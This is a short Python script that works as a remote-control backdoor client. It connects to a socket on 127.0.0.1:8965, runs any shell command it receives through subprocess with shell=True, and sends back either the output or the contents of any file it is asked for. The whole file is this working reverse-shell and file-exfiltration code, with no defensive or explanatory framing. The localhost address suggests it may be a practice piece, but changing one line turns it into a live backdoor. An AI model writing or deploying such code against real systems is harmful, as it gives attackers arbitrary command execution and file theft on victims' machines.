import os
import socket
import subprocess


def file_size(path):
    return os.path.getsize(path)


def client():
    s = socket.socket()
    s.connect(('127.0.0.1', 8965))

    # message = input('-> ')
    while True:
        data = s.recv(1024).decode('utf-8')
        if 'cmd' in data:
            try:
                data = data.replace('cmd ', '')
                s.send(subprocess.check_output(data, shell=True))
            except Exception:
                s.send(f"Error with {data} command".encode('utf-8'))

        elif 'get file' in data:
            data = data.replace('get file ', '')
            content = ''
            with open(data, 'rb') as f:
                content = f.read()
                s.sendall(content)


        else:
            s.send('The command was not found'.encode('utf-8'))

    s.close()


if __name__ == '__main__':
    client()
